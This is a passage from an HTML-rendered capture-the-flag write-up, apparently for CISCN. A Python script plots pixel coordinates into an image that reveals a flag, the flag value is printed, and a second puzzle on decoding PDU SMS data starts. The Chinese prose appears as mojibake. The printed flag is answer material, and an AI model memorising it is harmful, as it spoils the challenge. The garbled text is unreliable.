class="number">56</span>], [<span class="number">118</span>, <span class="number">57</span>], [<span class="number">120</span>, <span class="number">57</span>], [<span class="number">122</span>, <span class="number">57</span>], [<span class="number">124</span>, <span class="number">57</span>], [<span class="number">126</span>, <span class="number">57</span>], [<span class="number">128</span>, <span class="number">57</span>], [<span class="number">131</span>, <span class="number">57</span>], [<span class="number">133</span>, <span class="number">57</span>],</span><br><span class="line">    [<span class="number">136</span>, <span class="number">57</span>], [<span class="number">138</span>, <span class="number">57</span>], [<span class="number">141</span>, <span class="number">57</span>], [<span class="number">143</span>, <span class="number">56</span>], [<span class="number">145</span>, <span class="number">55</span>], [<span class="number">147</span>, <span class="number">53</span>], [<span class="number">149</span>, <span class="number">52</span>], [<span class="number">150</span>, <span class="number">52</span>], [<span class="number">152</span>, <span class="number">50</span>],</span><br><span class="line">    [<span class="number">153</span>, <span class="number">49</span>], [<span class="number">155</span>, <span class="number">47</span>], [<span class="number">156</span>, <span class="number">46</span>], [<span class="number">157</span>, <span class="number">45</span>], [<span class="number">212</span>, <span class="number">24</span>], [<span class="number">212</span>, <span class="number">24</span>], [<span class="number">213</span>, <span class="number">23</span>], [<span class="number">211</span>, <span class="number">21</span>], [<span class="number">210</span>, <span class="number">20</span>],</span><br><span class="line">    [<span class="number">209</span>, <span class="number">19</span>], [<span class="number">208</span>, <span class="number">18</span>], [<span class="number">207</span>, <span class="number">17</span>], [<span class="number">206</span>, <span class="number">16</span>], [<span class="number">205</span>, <span class="number">15</span>], [<span class="number">204</span>, <span class="number">15</span>], [<span class="number">201</span>, <span class="number">14</span>], [<span class="number">200</span>, <span class="number">14</span>], [<span class="number">199</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">197</span>, <span class="number">14</span>], [<span class="number">196</span>, <span class="number">14</span>], [<span class="number">195</span>, <span class="number">14</span>], [<span class="number">193</span>, <span class="number">14</span>], [<span class="number">191</span>, <span class="number">14</span>], [<span class="number">189</span>, <span class="number">16</span>], [<span class="number">188</span>, <span class="number">16</span>], [<span class="number">187</span>, <span class="number">16</span>], [<span class="number">186</span>, <span class="number">17</span>],</span><br><span class="line">    [<span class="number">185</span>, <span class="number">17</span>], [<span class="number">183</span>, <span class="number">18</span>], [<span class="number">183</span>, <span class="number">20</span>], [<span class="number">183</span>, <span class="number">21</span>], [<span class="number">182</span>, <span class="number">22</span>], [<span class="number">182</span>, <span class="number">23</span>], [<span class="number">182</span>, <span class="number">24</span>], [<span class="number">182</span>, <span class="number">25</span>], [<span class="number">182</span>, <span class="number">26</span>],</span><br><span class="line">    [<span class="number">182</span>, <span class="number">27</span>], [<span class="number">182</span>, <span class="number">29</span>], [<span class="number">183</span>, <span class="number">31</span>], [<span class="number">184</span>, <span class="number">32</span>], [<span class="number">186</span>, <span class="number">33</span>], [<span class="number">187</span>, <span class="number">34</span>], [<span class="number">188</span>, <span class="number">34</span>], [<span class="number">189</span>, <span class="number">35</span>], [<span class="number">190</span>, <span class="number">35</span>],</span><br><span class="line">    [<span class="number">192</span>, <span class="number">36</span>], [<span class="number">194</span>, <span class="number">37</span>], [<span class="number">196</span>, <span class="number">37</span>], [<span class="number">198</span>, <span class="number">38</span>], [<span class="number">199</span>, <span class="number">38</span>], [<span class="number">200</span>, <span class="number">38</span>], [<span class="number">201</span>, <span class="number">38</span>], [<span class="number">202</span>, <span class="number">39</span>], [<span class="number">203</span>, <span class="number">39</span>],</span><br><span class="line">    [<span class="number">204</span>, <span class="number">40</span>], [<span class="number">207</span>, <span class="number">41</span>], [<span class="number">207</span>, <span class="number">42</span>], [<span class="number">208</span>, <span class="number">43</span>], [<span class="number">208</span>, <span class="number">44</span>], [<span class="number">208</span>, <span class="number">45</span>], [<span class="number">208</span>, <span class="number">46</span>], [<span class="number">208</span>, <span class="number">48</span>], [<span class="number">208</span>, <span class="number">50</span>],</span><br><span class="line">    [<span class="number">208</span>, <span class="number">51</span>], [<span class="number">207</span>, <span class="number">53</span>], [<span class="number">207</span>, <span class="number">54</span>], [<span class="number">206</span>, <span class="number">56</span>], [<span class="number">204</span>, <span class="number">58</span>], [<span class="number">203</span>, <span class="number">60</span>], [<span class="number">202</span>, <span class="number">61</span>], [<span class="number">201</span>, <span class="number">62</span>], [<span class="number">201</span>, <span class="number">63</span>],</span><br><span class="line">    [<span class="number">200</span>, <span class="number">64</span>], [<span class="number">199</span>, <span class="number">64</span>], [<span class="number">198</span>, <span class="number">64</span>], [<span class="number">197</span>, <span class="number">65</span>], [<span class="number">196</span>, <span class="number">65</span>], [<span class="number">195</span>, <span class="number">65</span>], [<span class="number">193</span>, <span class="number">65</span>], [<span class="number">192</span>, <span class="number">65</span>], [<span class="number">190</span>, <span class="number">65</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">65</span>], [<span class="number">187</span>, <span class="number">65</span>], [<span class="number">185</span>, <span class="number">65</span>], [<span class="number">184</span>, <span class="number">65</span>], [<span class="number">183</span>, <span class="number">65</span>], [<span class="number">181</span>, <span class="number">64</span>], [<span class="number">180</span>, <span class="number">63</span>], [<span class="number">179</span>, <span class="number">63</span>], [<span class="number">178</span>, <span class="number">62</span>],</span><br><span class="line">    [<span class="number">177</span>, <span class="number">62</span>], [<span class="number">175</span>, <span class="number">61</span>], [<span class="number">174</span>, <span class="number">60</span>], [<span class="number">173</span>, <span class="number">59</span>], [<span class="number">243</span>, <span class="number">20</span>], [<span class="number">243</span>, <span class="number">20</span>], [<span class="number">244</span>, <span class="number">19</span>], [<span class="number">244</span>, <span class="number">21</span>], [<span class="number">244</span>, <span class="number">25</span>],</span><br><span class="line">    [<span class="number">245</span>, <span class="number">26</span>], [<span class="number">245</span>, <span class="number">29</span>], [<span class="number">247</span>, <span class="number">32</span>], [<span class="number">247</span>, <span class="number">34</span>], [<span class="number">248</span>, <span class="number">36</span>], [<span class="number">248</span>, <span class="number">37</span>], [<span class="number">249</span>, <span class="number">39</span>], [<span class="number">250</span>, <span class="number">40</span>], [<span class="number">251</span>, <span class="number">42</span>],</span><br><span class="line">    [<span class="number">251</span>, <span class="number">43</span>], [<span class="number">252</span>, <span class="number">44</span>], [<span class="number">254</span>, <span class="number">44</span>], [<span class="number">256</span>, <span class="number">44</span>], [<span class="number">258</span>, <span class="number">44</span>], [<span class="number">260</span>, <span class="number">42</span>], [<span class="number">262</span>, <span class="number">41</span>], [<span class="number">263</span>, <span class="number">40</span>], [<span class="number">265</span>, <span class="number">38</span>],</span><br><span class="line">    [<span class="number">266</span>, <span class="number">35</span>], [<span class="number">267</span>, <span class="number">32</span>], [<span class="number">268</span>, <span class="number">30</span>], [<span class="number">271</span>, <span class="number">27</span>], [<span class="number">272</span>, <span class="number">25</span>], [<span class="number">273</span>, <span class="number">22</span>], [<span class="number">274</span>, <span class="number">21</span>], [<span class="number">275</span>, <span class="number">20</span>], [<span class="number">275</span>, <span class="number">19</span>],</span><br><span class="line">    [<span class="number">274</span>, <span class="number">18</span>], [<span class="number">274</span>, <span class="number">20</span>], [<span class="number">272</span>, <span class="number">22</span>], [<span class="number">271</span>, <span class="number">23</span>], [<span class="number">271</span>, <span class="number">26</span>], [<span class="number">268</span>, <span class="number">29</span>], [<span class="number">266</span>, <span class="number">33</span>], [<span class="number">266</span>, <span class="number">35</span>], [<span class="number">265</span>, <span class="number">37</span>],</span><br><span class="line">    [<span class="number">263</span>, <span class="number">40</span>], [<span class="number">262</span>, <span class="number">42</span>], [<span class="number">262</span>, <span class="number">44</span>], [<span class="number">261</span>, <span class="number">47</span>], [<span class="number">260</span>, <span class="number">49</span>], [<span class="number">259</span>, <span class="number">51</span>], [<span class="number">258</span>, <span class="number">55</span>], [<span class="number">258</span>, <span class="number">56</span>], [<span class="number">257</span>, <span class="number">58</span>],</span><br><span class="line">    [<span class="number">255</span>, <span class="number">61</span>], [<span class="number">254</span>, <span class="number">62</span>], [<span class="number">253</span>, <span class="number">63</span>], [<span class="number">253</span>, <span class="number">64</span>], [<span class="number">252</span>, <span class="number">65</span>], [<span class="number">251</span>, <span class="number">66</span>], [<span class="number">250</span>, <span class="number">67</span>], [<span class="number">249</span>, <span class="number">68</span>], [<span class="number">248</span>, <span class="number">69</span>],</span><br><span class="line">    [<span class="number">247</span>, <span class="number">70</span>], [<span class="number">246</span>, <span class="number">71</span>], [<span class="number">245</span>, <span class="number">72</span>], [<span class="number">244</span>, <span class="number">73</span>], [<span class="number">298</span>, <span class="number">64</span>], [<span class="number">298</span>, <span class="number">64</span>], [<span class="number">299</span>, <span class="number">65</span>], [<span class="number">300</span>, <span class="number">65</span>], [<span class="number">302</span>, <span class="number">65</span>],</span><br><span class="line">    [<span class="number">304</span>, <span class="number">65</span>], [<span class="number">306</span>, <span class="number">65</span>], [<span class="number">308</span>, <span class="number">65</span>], [<span class="number">309</span>, <span class="number">65</span>], [<span class="number">312</span>, <span class="number">65</span>], [<span class="number">315</span>, <span class="number">65</span>], [<span class="number">317</span>, <span class="number">65</span>], [<span class="number">319</span>, <span class="number">65</span>], [<span class="number">322</span>, <span class="number">65</span>],</span><br><span class="line">    [<span class="number">325</span>, <span class="number">65</span>], [<span class="number">327</span>, <span class="number">65</span>], [<span class="number">330</span>, <span class="number">65</span>], [<span class="number">332</span>, <span class="number">65</span>], [<span class="number">334</span>, <span class="number">66</span>], [<span class="number">335</span>, <span class="number">66</span>], [<span class="number">20</span>, <span class="number">103</span>], [<span class="number">20</span>, <span class="number">104</span>], [<span class="number">20</span>, <span class="number">107</span>],</span><br><span class="line">    [<span class="number">20</span>, <span class="number">110</span>], [<span class="number">20</span>, <span class="number">112</span>], [<span class="number">20</span>, <span class="number">114</span>], [<span class="number">20</span>, <span class="number">118</span>], [<span class="number">19</span>, <span class="number">121</span>], [<span class="number">18</span>, <span class="number">124</span>], [<span class="number">17</span>, <span class="number">126</span>], [<span class="number">17</span>, <span class="number">130</span>], [<span class="number">17</span>, <span class="number">134</span>],</span><br><span class="line">    [<span class="number">17</span>, <span class="number">137</span>], [<span class="number">17</span>, <span class="number">139</span>], [<span class="number">17</span>, <span class="number">142</span>], [<span class="number">17</span>, <span class="number">143</span>], [<span class="number">17</span>, <span class="number">146</span>], [<span class="number">17</span>, <span class="number">147</span>], [<span class="number">17</span>, <span class="number">149</span>], [<span class="number">17</span>, <span class="number">150</span>], [<span class="number">17</span>, <span class="number">149</span>],</span><br><span class="line">    [<span class="number">17</span>, <span class="number">148</span>], [<span class="number">17</span>, <span class="number">146</span>], [<span class="number">18</span>, <span class="number">145</span>], [<span class="number">18</span>, <span class="number">143</span>], [<span class="number">19</span>, <span class="number">142</span>], [<span class="number">20</span>, <span class="number">141</span>], [<span class="number">20</span>, <span class="number">140</span>], [<span class="number">21</span>, <span class="number">138</span>], [<span class="number">21</span>, <span class="number">137</span>],</span><br><span class="line">    [<span class="number">22</span>, <span class="number">135</span>], [<span class="number">23</span>, <span class="number">134</span>], [<span class="number">24</span>, <span class="number">132</span>], [<span class="number">25</span>, <span class="number">131</span>], [<span class="number">26</span>, <span class="number">129</span>], [<span class="number">27</span>, <span class="number">128</span>], [<span class="number">28</span>, <span class="number">127</span>], [<span class="number">29</span>, <span class="number">126</span>], [<span class="number">31</span>, <span class="number">125</span>],</span><br><span class="line">    [<span class="number">32</span>, <span class="number">124</span>], [<span class="number">32</span>, <span class="number">123</span>], [<span class="number">34</span>, <span class="number">121</span>], [<span class="number">35</span>, <span class="number">120</span>], [<span class="number">37</span>, <span class="number">120</span>], [<span class="number">38</span>, <span class="number">119</span>], [<span class="number">40</span>, <span class="number">118</span>], [<span class="number">41</span>, <span class="number">118</span>], [<span class="number">43</span>, <span class="number">117</span>],</span><br><span class="line">    [<span class="number">44</span>, <span class="number">116</span>], [<span class="number">46</span>, <span class="number">115</span>], [<span class="number">48</span>, <span class="number">115</span>], [<span class="number">49</span>, <span class="number">114</span>], [<span class="number">50</span>, <span class="number">113</span>], [<span class="number">51</span>, <span class="number">113</span>], [<span class="number">52</span>, <span class="number">112</span>], [<span class="number">80</span>, <span class="number">121</span>], [<span class="number">80</span>, <span class="number">121</span>],</span><br><span class="line">    [<span class="number">79</span>, <span class="number">120</span>], [<span class="number">78</span>, <span class="number">121</span>], [<span class="number">77</span>, <span class="number">122</span>], [<span class="number">77</span>, <span class="number">123</span>], [<span class="number">77</span>, <span class="number">124</span>], [<span class="number">76</span>, <span class="number">127</span>], [<span class="number">75</span>, <span class="number">128</span>], [<span class="number">74</span>, <span class="number">129</span>], [<span class="number">73</span>, <span class="number">131</span>],</span><br><span class="line">    [<span class="number">73</span>, <span class="number">132</span>], [<span class="number">73</span>, <span class="number">133</span>], [<span class="number">72</span>, <span class="number">135</span>], [<span class="number">72</span>, <span class="number">136</span>], [<span class="number">72</span>, <span class="number">137</span>], [<span class="number">72</span>, <span class="number">138</span>], [<span class="number">72</span>, <span class="number">139</span>], [<span class="number">72</span>, <span class="number">140</span>], [<span class="number">72</span>, <span class="number">142</span>],</span><br><span class="line">    [<span class="number">72</span>, <span class="number">144</span>], [<span class="number">72</span>, <span class="number">145</span>], [<span class="number">73</span>, <span class="number">148</span>], [<span class="number">74</span>, <span class="number">149</span>], [<span class="number">77</span>, <span class="number">150</span>], [<span class="number">78</span>, <span class="number">150</span>], [<span class="number">80</span>, <span class="number">151</span>], [<span class="number">81</span>, <span class="number">151</span>], [<span class="number">82</span>, <span class="number">151</span>],</span><br><span class="line">    [<span class="number">83</span>, <span class="number">151</span>], [<span class="number">84</span>, <span class="number">151</span>], [<span class="number">85</span>, <span class="number">151</span>], [<span class="number">87</span>, <span class="number">151</span>], [<span class="number">89</span>, <span class="number">151</span>], [<span class="number">90</span>, <span class="number">151</span>], [<span class="number">92</span>, <span class="number">150</span>], [<span class="number">93</span>, <span class="number">150</span>], [<span class="number">95</span>, <span class="number">149</span>],</span><br><span class="line">    [<span class="number">97</span>, <span class="number">147</span>], [<span class="number">98</span>, <span class="number">146</span>], [<span class="number">99</span>, <span class="number">146</span>], [<span class="number">100</span>, <span class="number">145</span>], [<span class="number">101</span>, <span class="number">144</span>], [<span class="number">102</span>, <span class="number">142</span>], [<span class="number">102</span>, <span class="number">141</span>], [<span class="number">104</span>, <span class="number">139</span>],</span><br><span class="line">    [<span class="number">104</span>, <span class="number">138</span>], [<span class="number">105</span>, <span class="number">136</span>], [<span class="number">105</span>, <span class="number">135</span>], [<span class="number">105</span>, <span class="number">133</span>], [<span class="number">105</span>, <span class="number">132</span>], [<span class="number">105</span>, <span class="number">131</span>], [<span class="number">105</span>, <span class="number">129</span>], [<span class="number">104</span>, <span class="number">128</span>],</span><br><span class="line">    [<span class="number">103</span>, <span class="number">126</span>], [<span class="number">102</span>, <span class="number">126</span>], [<span class="number">101</span>, <span class="number">125</span>], [<span class="number">98</span>, <span class="number">123</span>], [<span class="number">96</span>, <span class="number">123</span>], [<span class="number">95</span>, <span class="number">123</span>], [<span class="number">93</span>, <span class="number">123</span>], [<span class="number">92</span>, <span class="number">122</span>], [<span class="number">90</span>, <span class="number">121</span>],</span><br><span class="line">    [<span class="number">89</span>, <span class="number">121</span>], [<span class="number">86</span>, <span class="number">120</span>], [<span class="number">147</span>, <span class="number">98</span>], [<span class="number">147</span>, <span class="number">98</span>], [<span class="number">146</span>, <span class="number">99</span>], [<span class="number">145</span>, <span class="number">100</span>], [<span class="number">144</span>, <span class="number">103</span>], [<span class="number">143</span>, <span class="number">104</span>],</span><br><span class="line">    [<span class="number">142</span>, <span class="number">105</span>], [<span class="number">142</span>, <span class="number">106</span>], [<span class="number">142</span>, <span class="number">109</span>], [<span class="number">142</span>, <span class="number">111</span>], [<span class="number">142</span>, <span class="number">114</span>], [<span class="number">141</span>, <span class="number">118</span>], [<span class="number">140</span>, <span class="number">120</span>], [<span class="number">139</span>, <span class="number">123</span>],</span><br><span class="line">    [<span class="number">138</span>, <span class="number">127</span>], [<span class="number">138</span>, <span class="number">129</span>], [<span class="number">137</span>, <span class="number">133</span>], [<span class="number">135</span>, <span class="number">135</span>], [<span class="number">134</span>, <span class="number">137</span>], [<span class="number">133</span>, <span class="number">139</span>], [<span class="number">131</span>, <span class="number">142</span>], [<span class="number">131</span>, <span class="number">143</span>],</span><br><span class="line">    [<span class="number">131</span>, <span class="number">145</span>], [<span class="number">130</span>, <span class="number">146</span>], [<span class="number">129</span>, <span class="number">149</span>], [<span class="number">128</span>, <span class="number">152</span>], [<span class="number">128</span>, <span class="number">153</span>], [<span class="number">127</span>, <span class="number">156</span>], [<span class="number">127</span>, <span class="number">157</span>], [<span class="number">126</span>, <span class="number">158</span>],</span><br><span class="line">    [<span class="number">127</span>, <span class="number">157</span>], [<span class="number">129</span>, <span class="number">157</span>], [<span class="number">130</span>, <span class="number">156</span>], [<span class="number">132</span>, <span class="number">156</span>], [<span class="number">134</span>, <span class="number">155</span>], [<span class="number">137</span>, <span class="number">153</span>], [<span class="number">138</span>, <span class="number">152</span>], [<span class="number">139</span>, <span class="number">151</span>],</span><br><span class="line">    [<span class="number">140</span>, <span class="number">150</span>], [<span class="number">143</span>, <span class="number">149</span>], [<span class="number">144</span>, <span class="number">148</span>], [<span class="number">145</span>, <span class="number">147</span>], [<span class="number">146</span>, <span class="number">146</span>], [<span class="number">147</span>, <span class="number">145</span>], [<span class="number">149</span>, <span class="number">144</span>], [<span class="number">149</span>, <span class="number">143</span>],</span><br><span class="line">    [<span class="number">150</span>, <span class="number">142</span>], [<span class="number">151</span>, <span class="number">141</span>], [<span class="number">152</span>, <span class="number">140</span>], [<span class="number">152</span>, <span class="number">139</span>], [<span class="number">153</span>, <span class="number">138</span>], [<span class="number">153</span>, <span class="number">137</span>], [<span class="number">153</span>, <span class="number">136</span>], [<span class="number">153</span>, <span class="number">135</span>],</span><br><span class="line">    [<span class="number">153</span>, <span class="number">134</span>], [<span class="number">153</span>, <span class="number">133</span>], [<span class="number">152</span>, <span class="number">132</span>], [<span class="number">151</span>, <span class="number">131</span>], [<span class="number">150</span>, <span class="number">131</span>], [<span class="number">149</span>, <span class="number">130</span>], [<span class="number">147</span>, <span class="number">129</span>], [<span class="number">186</span>, <span class="number">136</span>],</span><br><span class="line">    [<span class="number">186</span>, <span class="number">136</span>], [<span class="number">183</span>, <span class="number">137</span>], [<span class="number">182</span>, <span class="number">138</span>], [<span class="number">182</span>, <span class="number">139</span>], [<span class="number">182</span>, <span class="number">140</span>], [<span class="number">181</span>, <span class="number">142</span>], [<span class="number">179</span>, <span class="number">144</span>], [<span class="number">179</span>, <span class="number">145</span>],</span><br><span class="line">    [<span class="number">179</span>, <span class="number">147</span>], [<span class="number">178</span>, <span class="number">149</span>], [<span class="number">177</span>, <span class="number">150</span>], [<span class="number">177</span>, <span class="number">151</span>], [<span class="number">177</span>, <span class="number">152</span>], [<span class="number">177</span>, <span class="number">154</span>], [<span class="number">177</span>, <span class="number">156</span>], [<span class="number">177</span>, <span class="number">157</span>],</span><br><span class="line">    [<span class="number">177</span>, <span class="number">158</span>], [<span class="number">178</span>, <span class="number">160</span>], [<span class="number">179</span>, <span class="number">161</span>], [<span class="number">180</span>, <span class="number">162</span>], [<span class="number">181</span>, <span class="number">163</span>], [<span class="number">182</span>, <span class="number">164</span>], [<span class="number">184</span>, <span class="number">164</span>], [<span class="number">186</span>, <span class="number">164</span>],</span><br><span class="line">    [<span class="number">187</span>, <span class="number">164</span>], [<span class="number">188</span>, <span class="number">164</span>], [<span class="number">190</span>, <span class="number">163</span>], [<span class="number">191</span>, <span class="number">162</span>], [<span class="number">192</span>, <span class="number">162</span>], [<span class="number">194</span>, <span class="number">160</span>], [<span class="number">196</span>, <span class="number">159</span>], [<span class="number">197</span>, <span class="number">158</span>],</span><br><span class="line">    [<span class="number">197</span>, <span class="number">156</span>], [<span class="number">198</span>, <span class="number">155</span>], [<span class="number">200</span>, <span class="number">153</span>], [<span class="number">200</span>, <span class="number">152</span>], [<span class="number">201</span>, <span class="number">150</span>], [<span class="number">201</span>, <span class="number">149</span>], [<span class="number">201</span>, <span class="number">148</span>], [<span class="number">201</span>, <span class="number">147</span>],</span><br><span class="line">    [<span class="number">201</span>, <span class="number">145</span>], [<span class="number">201</span>, <span class="number">144</span>], [<span class="number">201</span>, <span class="number">142</span>], [<span class="number">201</span>, <span class="number">141</span>], [<span class="number">201</span>, <span class="number">139</span>], [<span class="number">201</span>, <span class="number">138</span>], [<span class="number">200</span>, <span class="number">136</span>], [<span class="number">199</span>, <span class="number">135</span>],</span><br><span class="line">    [<span class="number">198</span>, <span class="number">135</span>], [<span class="number">197</span>, <span class="number">135</span>], [<span class="number">196</span>, <span class="number">135</span>], [<span class="number">195</span>, <span class="number">135</span>], [<span class="number">193</span>, <span class="number">135</span>], [<span class="number">192</span>, <span class="number">135</span>], [<span class="number">190</span>, <span class="number">135</span>], [<span class="number">189</span>, <span class="number">135</span>],</span><br><span class="line">    [<span class="number">223</span>, <span class="number">167</span>], [<span class="number">223</span>, <span class="number">167</span>], [<span class="number">224</span>, <span class="number">167</span>], [<span class="number">226</span>, <span class="number">167</span>], [<span class="number">228</span>, <span class="number">167</span>], [<span class="number">229</span>, <span class="number">167</span>], [<span class="number">232</span>, <span class="number">167</span>], [<span class="number">233</span>, <span class="number">167</span>],</span><br><span class="line">    [<span class="number">234</span>, <span class="number">167</span>], [<span class="number">235</span>, <span class="number">167</span>], [<span class="number">237</span>, <span class="number">167</span>], [<span class="number">238</span>, <span class="number">167</span>], [<span class="number">240</span>, <span class="number">167</span>], [<span class="number">241</span>, <span class="number">167</span>], [<span class="number">243</span>, <span class="number">167</span>], [<span class="number">244</span>, <span class="number">167</span>],</span><br><span class="line">    [<span class="number">246</span>, <span class="number">167</span>], [<span class="number">247</span>, <span class="number">167</span>], [<span class="number">250</span>, <span class="number">168</span>], [<span class="number">251</span>, <span class="number">168</span>], [<span class="number">252</span>, <span class="number">168</span>], [<span class="number">253</span>, <span class="number">168</span>], [<span class="number">254</span>, <span class="number">168</span>], [<span class="number">269</span>, <span class="number">135</span>],</span><br><span class="line">    [<span class="number">271</span>, <span class="number">136</span>], [<span class="number">273</span>, <span class="number">138</span>], [<span class="number">275</span>, <span class="number">140</span>], [<span class="number">276</span>, <span class="number">141</span>], [<span class="number">278</span>, <span class="number">143</span>], [<span class="number">280</span>, <span class="number">145</span>], [<span class="number">282</span>, <span class="number">147</span>], [<span class="number">284</span>, <span class="number">149</span>],</span><br><span class="line">    [<span class="number">285</span>, <span class="number">150</span>], [<span class="number">288</span>, <span class="number">152</span>], [<span class="number">289</span>, <span class="number">153</span>], [<span class="number">291</span>, <span class="number">154</span>], [<span class="number">293</span>, <span class="number">156</span>], [<span class="number">294</span>, <span class="number">157</span>], [<span class="number">296</span>, <span class="number">159</span>], [<span class="number">297</span>, <span class="number">160</span>],</span><br><span class="line">    [<span class="number">298</span>, <span class="number">161</span>], [<span class="number">299</span>, <span class="number">162</span>], [<span class="number">300</span>, <span class="number">136</span>], [<span class="number">299</span>, <span class="number">136</span>], [<span class="number">297</span>, <span class="number">137</span>], [<span class="number">296</span>, <span class="number">138</span>], [<span class="number">294</span>, <span class="number">141</span>], [<span class="number">294</span>, <span class="number">142</span>],</span><br><span class="line">    [<span class="number">293</span>, <span class="number">144</span>], [<span class="number">293</span>, <span class="number">145</span>], [<span class="number">292</span>, <span class="number">148</span>], [<span class="number">291</span>, <span class="number">149</span>], [<span class="number">290</span>, <span class="number">151</span>], [<span class="number">288</span>, <span class="number">153</span>], [<span class="number">288</span>, <span class="number">155</span>], [<span class="number">287</span>, <span class="number">156</span>],</span><br><span class="line">    [<span class="number">286</span>, <span class="number">157</span>], [<span class="number">285</span>, <span class="number">159</span>], [<span class="number">284</span>, <span class="number">160</span>], [<span class="number">283</span>, <span class="number">161</span>], [<span class="number">282</span>, <span class="number">162</span>], [<span class="number">281</span>, <span class="number">163</span>], [<span class="number">280</span>, <span class="number">164</span>], [<span class="number">279</span>, <span class="number">165</span>],</span><br><span class="line">    [<span class="number">327</span>, <span class="number">142</span>], [<span class="number">328</span>, <span class="number">143</span>], [<span class="number">330</span>, <span class="number">145</span>], [<span class="number">332</span>, <span class="number">148</span>], [<span class="number">333</span>, <span class="number">149</span>], [<span class="number">335</span>, <span class="number">151</span>], [<span class="number">337</span>, <span class="number">154</span>], [<span class="number">339</span>, <span class="number">156</span>],</span><br><span class="line">    [<span class="number">341</span>, <span class="number">158</span>], [<span class="number">342</span>, <span class="number">159</span>], [<span class="number">345</span>, <span class="number">160</span>], [<span class="number">347</span>, <span class="number">161</span>], [<span class="number">348</span>, <span class="number">162</span>], [<span class="number">350</span>, <span class="number">164</span>], [<span class="number">351</span>, <span class="number">165</span>], [<span class="number">352</span>, <span class="number">166</span>],</span><br><span class="line">    [<span class="number">355</span>, <span class="number">168</span>], [<span class="number">356</span>, <span class="number">169</span>], [<span class="number">351</span>, <span class="number">143</span>], [<span class="number">350</span>, <span class="number">143</span>], [<span class="number">348</span>, <span class="number">144</span>], [<span class="number">347</span>, <span class="number">144</span>], [<span class="number">346</span>, <span class="number">145</span>], [<span class="number">343</span>, <span class="number">148</span>],</span><br><span class="line">    [<span class="number">341</span>, <span class="number">150</span>], [<span class="number">339</span>, <span class="number">152</span>], [<span class="number">336</span>, <span class="number">155</span>], [<span class="number">333</span>, <span class="number">158</span>], [<span class="number">330</span>, <span class="number">159</span>], [<span class="number">327</span>, <span class="number">162</span>], [<span class="number">325</span>, <span class="number">165</span>], [<span class="number">323</span>, <span class="number">167</span>],</span><br><span class="line">    [<span class="number">322</span>, <span class="number">168</span>], [<span class="number">319</span>, <span class="number">170</span>], [<span class="number">317</span>, <span class="number">171</span>], [<span class="number">316</span>, <span class="number">171</span>], [<span class="number">314</span>, <span class="number">172</span>], [<span class="number">313</span>, <span class="number">172</span>]]</span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">357</span>, <span class="number">173</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">[image.putpixel((location[<span class="number">0</span>], location[<span class="number">1</span>]), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>)) <span class="keyword">for</span> location <span class="keyword">in</span> pixelsLocations]</span><br><span class="line">image.save(<span class="string">&quot;result2.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ï¼Œå°†å…¶ä¸Šå†…å®¹è½¬å†™åè½¬æ¢å‡ºå…¶çš„ MD5 å€¼å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621099954086/d82eb7033f149d096d3845f7b9924286350c5f61.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;d4f1fb80bc11ffd722861367747c0f10&#125;</span><br></pre></td></tr></table></figure><h3 id="éš”ç©ºä¼ è¯"><a href="#éš”ç©ºä¼ è¯" class="headerlink" title="éš”ç©ºä¼ è¯"></a>éš”ç©ºä¼ è¯</h3><p>æŠŠé™„ä»¶å†…å®¹ç¨å¾®æœä¸€ä¸‹å¯ä»¥å¾—åˆ°æ•°æ®æ˜¯ PDU çŸ­ä¿¡çš„æ•°æ®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621257298444/00afc51e45938d0bf34c4b21ce46d003e4fb06a4.png"></p><blockquote><p><a href="http://www.sendsms.cn/pdu/">http://www.sendsms.cn/pdu/</a></p></blockquote><p>å°†æ•°æ®æ•´ç†æˆ JavaScript çš„æ•°ç»„å½¢å¼ï¼Œé…åˆ <code>a.forEach(v =&gt; &#123;console.log(getPDUMetaInfo(v))&#125;)</code> æ¥å¾—åˆ°æ‰€æœ‰æ•°æ®çš„è§£æï¼Œè¿™é‡Œè´´ä¸Šéƒ¨åˆ†å…³é”®æ•°æ®ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">SMSC#</span><br><span class="line">Receipient:+8615030442000</span><br><span class="line">Validity:Rel 